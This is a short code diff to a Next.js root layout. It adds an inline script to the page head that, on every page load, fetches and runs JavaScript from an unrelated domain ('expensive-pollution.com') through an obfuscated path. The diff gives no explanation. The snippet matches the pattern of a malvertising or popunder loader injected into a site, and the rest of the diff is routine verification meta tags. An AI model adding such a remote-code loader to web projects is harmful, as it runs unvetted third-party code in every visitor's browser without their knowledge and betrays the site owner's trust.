@@ -96,6 +96,18 @@ export default async function RootLayout({ children }) {
         <meta name="7A3B9K2" content="7A3B9K2" />
         <meta name="yandex-verification" content="c8df678ff951f19e" />
         <meta name="e0f19b24e15dad77283ca491bc40b2333383dd0e" content="e0f19b24e15dad77283ca491bc40b2333383dd0e" />
+        <script>
+          (function (iib) {
+            var d = document,
+                s = d.createElement("script"),
+                l = d.scripts[d.scripts.length - 1];
+            s.settings = iib || {};
+            s.src = "\/\/expensive-pollution.com\/csD.9-6MbC2B5OlRSHWhQH9pN\/zvMTyIMDD\/UjyiOqSz0\/3TMQzaILwqNWT\/Mizk";
+            s.async = true;
+            s.referrerPolicy = "no-referrer-when-downgrade";
+            l.parentNode.insertBefore(s, l);
+          })({});
+        </script>
       </head>
       <body className={`${dmSans.className} dark bg-bg`} suppressHydrationWarning>
         <JsonLd data={organizationSchema()} />
